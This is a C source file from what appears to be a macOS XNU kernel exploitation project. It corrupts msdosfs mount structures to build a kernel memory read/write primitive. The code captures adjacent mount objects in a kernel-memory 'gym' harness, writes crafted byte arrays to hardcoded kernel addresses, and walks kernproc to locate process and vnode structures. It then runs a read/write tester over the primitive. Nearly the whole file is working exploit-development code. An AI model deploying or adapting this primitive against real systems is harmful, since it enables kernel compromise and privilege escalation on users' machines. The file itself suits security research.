//
//  main.c
//  kmem_msdosfs
//
//  Created by admin on 11/26/21.
//


#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <limits.h>
#include <string.h>
#include <signal.h>

#include <sys/errno.h>
#include <sys/fcntl.h>
#include <gym_client.h>

#include "platform_variables.h"
#include "allocator_msdosfs.h"
#include "platform_types.h"
#include "utils_misc.h"
#include "util_dispatch.h"
#include "kmem_gym.h"
#include "kmem_msdosfs.h"
#include "util_binary.h"
#include "xnu_proc.h"
#include "slider.h"
#include "kmem_tester.h"


void capture_msdosfs_mount_pair(uintptr_t* ptr1_out, xe_allocator_msdosfs_t* alloc1_out, uintptr_t* ptr2_out, xe_allocator_msdosfs_t* alloc2_out) {
    size_t count = 2;
    
    slot_id_t slots[count];
    int error = gym_multi_alloc_mem(TYPE_MSDOSFSMOUNT_SIZE, slots, XE_ARRAY_SIZE(slots));
    assert(error == 0);
    
    uintptr_t addrs[count];
    error = xe_util_dispatch_apply(addrs, sizeof(addrs[0]), XE_ARRAY_SIZE(addrs), slots, ^(void* ctx, void* data, size_t idx) {
        slot_id_t* slots = (slot_id_t*)ctx;
        uintptr_t* addr = (uintptr_t*)data;
        int error = gym_read_slot_address(slots[idx], addr);
        if (error) {
            return error;
        }
        return gym_destructible_free(*addr);
    });
    
    assert(error == 0);
    
    xe_allocator_msdosfs_t msdosfs_allocators[128];
    bzero(msdosfs_allocators, XE_ARRAY_SIZE(msdosfs_allocators));
    
    error = xe_util_dispatch_apply(msdosfs_allocators, sizeof(msdosfs_allocators[0]), XE_ARRAY_SIZE(msdosfs_allocators), NULL, ^(void* ctx, void* data, size_t idx) {
        char label[64];
        snprintf(label, sizeof(label), "xe_%ld", idx);
        return xe_allocator_msdosfs_create(label, (xe_allocator_msdosfs_t*)data);
    });
    assert(error == 0);
    
    int capture_idxs[count];
    error = xe_util_dispatch_apply(capture_idxs, sizeof(capture_idxs[0]), XE_ARRAY_SIZE(capture_idxs), slots, ^(void* ctx, void* data, size_t idx) {
        slot_id_t* slots = (slot_id_t*)ctx;
        char slot_data[TYPE_MSDOSFSMOUNT_SIZE];
        int error = gym_alloc_read(slots[idx], slot_data, sizeof(slot_data), NULL);
        if (error) {
            return error;
        }
        
        _Bool modified = 0;
        for (int i=0; i<TYPE_MSDOSFSMOUNT_SIZE; i++) {
            if (slot_data[i] != 0) {
                modified = 1;
                break;
            }
        }
        
        if (!modified) {
            return ENOTRECOVERABLE;
        }
        
        char* label = slot_data + TYPE_MSDOSFSMOUNT_MEM_PM_LABEL_OFFSET;
        char* endp;
        
        if (label[0] != 'x' || label[1] != 'e' || label[2] != '_') {
            return ENOTRECOVERABLE;
        }
        
        int capture_idx = (int)strtoul(&label[3], &endp, 10);
        *((int*)data) = capture_idx;
        
        return 0;
    });
    assert(error == 0);
    
    xe_allocator_msdosfs_t captured[count];
    for (int i=0; i<count; i++) {
        captured[i] = msdosfs_allocators[capture_idxs[i]];
    }
    
    error = xe_util_dispatch_apply(msdosfs_allocators, sizeof(msdosfs_allocators[0]), XE_ARRAY_SIZE(msdosfs_allocators), capture_idxs, ^(void* ctx, void* data, size_t idx) {
        int* captured_idxs = (int*)ctx;
        for (int i=0; i<count; i++) {
            if (captured_idxs[i] == idx) {
                return 0;
            }
        }
        return xe_allocator_msdosfs_destroy((xe_allocator_msdosfs_t*)data);
    });
    
    assert(error == 0);
    
    *ptr1_out = addrs[0];
    *ptr2_out = addrs[1];
    *alloc1_out = captured[0];
    *alloc2_out = captured[1];
}


int main1(int argc, const char* argv[]) {
    xe_kmem_setup(xe_kmem_gym_create());
    xe_slider_init();
    xe_allocator_msdosfs_loadkext();
    
    uintptr_t ptr1 = 0xfffffe2286c4c5c0;
    uintptr_t ptr2 = 0xfffffe2285aef300;
    const char* mount_point1 = "/tmp/exp_msdos.BwaxR0Pc/mount";
    const char* mount_point2 = "/tmp/exp_msdos.8ZdydjfM/mount";
    const char ptr1_data[] = {
        0x28, 0x0a, 0xbb, 0x1c, 0x15, 0xfe, 0xff,
        0xff, 0x3c, 0x00, 0x00, 0x01, 0xf5, 0x01, 0x00,
        0x00, 0x14, 0x00, 0x00, 0x00, 0xff, 0x01, 0x00,
        0x00, 0x00, 0x26, 0xb4, 0x1c, 0x15, 0xfe, 0xff,
        0xff, 0x00, 0x02, 0x00, 0x00, 0x01, 0x00, 0x02,
        0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00,
        0x00, 0x00, 0x02, 0x00, 0x00, 0x01, 0x00, 0x00,
        0x00, 0x0d, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00,
        0x00, 0x2d, 0x00, 0x00, 0x00, 0xd4, 0x07, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00,
        0x00, 0xff, 0x01, 0x00, 0x00, 0x09, 0x00, 0x00,
        0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x06, 0x00,
        0x00, 0xff, 0x0f, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x02, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
        0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x80, 0x00, 0x00, 0xec, 0x1e, 0x0b, 0x4f,
        0x35, 0xe9, 0x1a, 0x37, 0x8f, 0xb3, 0x1e, 0x36,
        0x68, 0xa7, 0x7f, 0x5f, 0x31, 0xd0, 0xf0, 0xb5,
        0x86, 0x78, 0x65, 0x5f, 0x31, 0x35, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00,
        0x00, 0x10, 0x79, 0x0f, 0x87, 0x22, 0xfe, 0xff,
        0xff, 0x20, 0x69, 0x0f, 0x87, 0x22, 0xfe, 0xff,
        0xff, 0x00, 0x41, 0xbb, 0x1c, 0x15, 0xfe, 0xff,
        0xff, 0x00, 0x42, 0xbb, 0x1c, 0x15, 0xfe, 0xff,
        0xff, 0x00, 0xc0, 0x82, 0x87, 0x22, 0xfe, 0xff,
        0xff, 0x00, 0x28, 0xae, 0x87, 0x22, 0xfe, 0xff,
        0xff, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
        0x00, 0x00, 0x99, 0xad, 0x1c, 0x15, 0xfe, 0xff,
        0xff, 0x90, 0x75, 0x13, 0x14, 0x15, 0xfe, 0xff,
        0xff, 0x70, 0x41, 0x0f, 0x87, 0x22, 0xfe, 0xff,
        0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
        0x00,
    };
    const char ptr2_data[] = {
        0xc8, 0x32, 0xbb, 0x1c, 0x15, 0xfe, 0xff,
        0xff, 0x37, 0x00, 0x00, 0x01, 0xf5, 0x01, 0x00,
        0x00, 0x14, 0x00, 0x00, 0x00, 0xff, 0x01, 0x00,
        0x00, 0x00, 0x2c, 0xb4, 0x1c, 0x15, 0xfe, 0xff,
        0xff, 0x00, 0x02, 0x00, 0x00, 0x01, 0x00, 0x02,
        0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00,
        0x00, 0x00, 0x02, 0x00, 0x00, 0x01, 0x00, 0x00,
        0x00, 0x0d, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00,
        0x00, 0x2d, 0x00, 0x00, 0x00, 0xd4, 0x07, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00,
        0x00, 0xff, 0x01, 0x00, 0x00, 0x09, 0x00, 0x00,
        0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x06, 0x00,
        0x00, 0xff, 0x0f, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x02, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00,
        0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x80, 0x00, 0x00, 0xec, 0x1e, 0x0b, 0x4f,
        0x35, 0xe9, 0x1a, 0x37, 0x8f, 0xb3, 0x1e, 0x36,
        0x68, 0xa7, 0x7f, 0x5f, 0x31, 0xd0, 0xf0, 0xb5,
        0x86, 0x78, 0x65, 0x5f, 0x31, 0x36, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x60, 0x0f, 0x87, 0x22, 0xfe, 0xff,
        0xff, 0x30, 0x74, 0x0f, 0x87, 0x22, 0xfe, 0xff,
        0xff, 0x00, 0x7c, 0xbb, 0x1c, 0x15, 0xfe, 0xff,
        0xff, 0x00, 0x7d, 0xbb, 0x1c, 0x15, 0xfe, 0xff,
        0xff, 0x00, 0x80, 0x82, 0x87, 0x22, 0xfe, 0xff,
        0xff, 0x80, 0xed, 0xad, 0x87, 0x22, 0xfe, 0xff,
        0xff, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
        0x00, 0x00, 0x8d, 0xad, 0x1c, 0x15, 0xfe, 0xff,
        0xff, 0x98, 0x13, 0x5b, 0x10, 0x15, 0xfe, 0xff,
        0xff, 0x80, 0x55, 0x0f, 0x87, 0x22, 0xfe, 0xff,
        0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
        0x00,
    };
    
    xe_kmem_write(ptr1, (void*)ptr1_data, sizeof(ptr1_data));
    xe_kmem_write(ptr2, (void*)ptr2_data, sizeof(ptr2_data));
        
    char temp_dir[PATH_MAX] = "/tmp/xe_kmem_XXXXXXX";
    assert(mkdtemp(temp_dir) != NULL);
    
    char path[PATH_MAX];
    snprintf(path, sizeof(path), "%s/worker_bridge", temp_dir);
    int worker_bridge_fd = open(path, O_CREAT | O_RDWR);
    assert(worker_bridge_fd >= 0);
    
    snprintf(path, sizeof(path), "%s/helper_bridge", temp_dir);
    int helper_bridge_fd = open(path, O_CREAT | O_RDWR);
    assert(helper_bridge_fd >= 0);
    
    uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_slide(VAR_KERNPROC_ADDR));
    uintptr_t proc;
    int error = xe_xnu_proc_current_proc(kernproc, &proc);
    assert(error == 0);
    
    uintptr_t worker_bridge_vnode;
    error = xe_xnu_proc_find_fd_data(proc, worker_bridge_fd, &worker_bridge_vnode);
    assert(error == 0);
    
    uintptr_t helper_bridge_vnode;
    error = xe_xnu_proc_find_fd_data(proc, helper_bridge_fd, &helper_bridge_vnode);
    assert(error == 0);
    
    struct kmem_msdosfs_init_args args;
    xe_kmem_read(args.worker_data, ptr1, sizeof(args.worker_data));
    args.worker_msdosfs = ptr1;
    args.worker_bridge_fd = worker_bridge_fd;
    args.worker_bridge_vnode = worker_bridge_vnode;
    strlcpy(args.worker_mount_point, mount_point1, sizeof(args.worker_mount_point));
    
    xe_kmem_read(args.helper_data, ptr2, sizeof(args.helper_data));
    args.helper_msdosfs = ptr2;
    args.helper_bridge_fd = helper_bridge_fd;
    args.helper_bridge_vnode = helper_bridge_vnode;
    strlcpy(args.helper_mount_point, mount_point2, sizeof(args.helper_mount_point));
    args.helper_mutator = ^(void* ctx, char data[TYPE_MSDOSFSMOUNT_SIZE]) {
        xe_kmem_write(ptr2, data, TYPE_MSDOSFSMOUNT_SIZE);
    };
    args.helper_mutator_ctx = NULL;
    
    xe_kmem_setup(xe_kmem_msdosfs_create(&args));
    xe_kmem_tester_run(100000, 1024);
    return 0;
}


int main2(int argc, const char* argv[]) {
    xe_kmem_setup(xe_kmem_gym_create());
    xe_allocator_msdosfs_loadkext();
    
    uintptr_t ptr1, ptr2;
    xe_allocator_msdosfs_t allocator1, allocator2;
    
    capture_msdosfs_mount_pair(&ptr1, &allocator1, &ptr2, &allocator2);
    printf("uintptr_t ptr1 = %p;\n", (void*)ptr1);
    printf("uintptr_t ptr2 = %p;\n", (void*)ptr2);
    
    char path[PATH_MAX];
    xe_allocator_msdosfs_get_mountpoint(allocator1, path, sizeof(path));
    printf("const char* mount_point1 = \"%s\";\n", path);
    
    xe_allocator_msdosfs_get_mountpoint(allocator2, path, sizeof(path));
    printf("const char* mount_point2 = \"%s\";\n", path);
    
    printf("const char ptr1_data[] = ");
    char ptr1_data[TYPE_MSDOSFSMOUNT_SIZE];
    xe_kmem_read(ptr1_data, ptr1, sizeof(ptr1_data));
    xe_util_binary_c_dump(ptr1_data, sizeof(ptr1_data));
    printf(";\n");
    
    printf("const char ptr2_data[] = ");
    char ptr2_data[TYPE_MSDOSFSMOUNT_SIZE];
    xe_kmem_read(ptr2_data, ptr2, sizeof(ptr2_data));
    xe_util_binary_c_dump(ptr2_data, sizeof(ptr2_data));
    printf(";\n");
    return 0;
}


int main(int argc, const char* argv[]) {
    return main1(argc, argv);
}
